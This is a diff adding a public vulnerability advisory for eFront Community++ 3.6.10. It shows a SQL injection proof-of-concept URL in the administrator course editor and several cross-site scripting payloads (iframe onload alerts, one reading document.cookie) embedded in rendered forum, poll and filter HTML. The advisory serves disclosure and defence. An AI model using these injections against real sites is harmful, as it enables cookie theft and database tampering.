@@ -1,0 +1,95 @@
+source: http://www.securityfocus.com/bid/51973/info
+
+eFront Community++ is prone to an SQL-injection vulnerability and multiple HTML-injection vulnerabilities because it fails to sufficiently sanitize user-supplied input data.
+
+Exploiting these issues may allow an attacker to compromise the application, access or modify data, exploit vulnerabilities in the underlying database, execute HTML and script code in the context of the affected site, steal cookie-based authentication credentials, or control how the site is rendered to the user; other attacks are also possible.
+
+eFront Community++ 3.6.10 is vulnerable; other versions may also be affected. 
+
+SQL Injection:
+
+http://www.example.com/communityplusplus/www/administrator.php?ctg=course&edit_course=-1'[SQL INJECTION!]
+
+HTML Injection:
+
+The vulnerabilities can be exploited by remote attacker with low or high required user inter action.
+For demonstration or reproduce ...
+
+
+<td xmlns="http://www.w3.org/1999/xhtml" class="layoutColumn center">
+        <div id="messageBlock" class="block">
+        
+<div class="blockContents messageContents">
+         <table class="messageBlock">
+             <tbody><tr><td>
+<img title="_FAILURE" alt="_FAILURE" class="sprite32 sprite32-warning" src="themes/default/images/others/transparent.gif"/>
+</td>
+              <td class="failureBlock">.....Invalid login name: "> (403)  <a onclick="eF_js_showDivPopup('Error 
+Details', 2, 'error_details')" href="javascript:void(0)">More info</a></td>
+              <td><img onclick="window.Effect 
+? new Effect.Fade($('messageBlock')) : document.getElementById('messageBlock').style.display = 'none';" title="Close" 
+alt="Close" class="sprite32 sprite32-close" src="themes/default/images/others/transparent.gif"/></td></tr>
+            
+</tbody></table>
+        </div>
+        </div>  <table class="centerTable">
+
+...or 
+<tr class="oddRowColor">
+<td>
+<img title="Forum" alt="Forum" class="forumIcon sprite32 sprite32-forum" 
+src="themes/default/images/others/transparent.gif"/><div>
+<a href="/communityplusplus/www/administrator.php?ctg=
+forum&forum=6">"><iframe a="" <<="" onload='alert("VL")' src="a">
+                                 
+<p></p>
+                                </div>
+                            
+</td>
+<td>0 Subforums, 0 Topics, 0  Messages       
+</td>
+       <td><span class = "emptyCategory">Never</span>
+
+</td>
+       <td class = "centerAlign">
+
+
+...or
+<div>
+
+<a style="white-space: normal;" class="smallHeader" href="/communityplusplus/www/administrator.php
+?ctg=forum&poll=1">"><iframe a="" <<="" onload="alert(document.cookie)" src="a">
+                                                  <p><p>"><iframe src=a onload=alert(document....</p></div>
+
+</td>                                         
+
+...or    
+<tr class="oddRowColor defaultRowHeight">.....<td colspan="3" class="emptyCategory">No data found</td></tr>
+                                            
+<tr class="defaultRowHeight"><td colspan="4" class="sortedTableFooter"><div class="sortTablefilter"><span 
+id="languagesTable_currentFilter" style="display: none;">"><iframe span="" <<="" onload='alert("VL")' 
+src="a"/></span><input type="text" id="0_sortedTable_filter" onkeypress="if (event.which == 13 || event.keyCode == 13) 
+{eF_js_filterData(0); return false;}" value=""><iframe src=a onload=alert("VL") <" onclick='if 
+(this.value.match("Filter...")) this.value = "";'/></div><span style="vertical-align: middle;">Rows: </span><select 
+onchange="numRows = parseInt(this.options[this.selectedIndex].value);eF_js_changeRowsPerPage(0, numRows)"
+
+
+...or
+</tr><tr>
+
+<td class="calendar ">
+<a href="administrator.php?ctg=calendar&view_calendar=1327968000"/></td>
+<td class="calendar "><a href="administrator.php?ctg=calendar&view_calendar=1327968000"/></td>
+
+<td class="calendar ">
+                    <a href="administrator.php?ctg=calendar&view_calendar=1328054400">1</a></td>
+
+<td class="calendar ">
+                    <a href="administrator.php?ctg=calendar&view_calendar=1328140800">2</a></td>
+<td class="calendar ">
+                    <a href="administrator.php?ctg=calendar&view_calendar=1328227200">3</a></td>
+<td class="calendar ">
+                    <a href="administrator.php?ctg=calendar&view_calendar=1328313600">4</a></td>
+<td class="calendar ">
+                    <a href="administrator.php?ctg=calendar&view_calendar=1328400000">5</a></td>
+</tr>
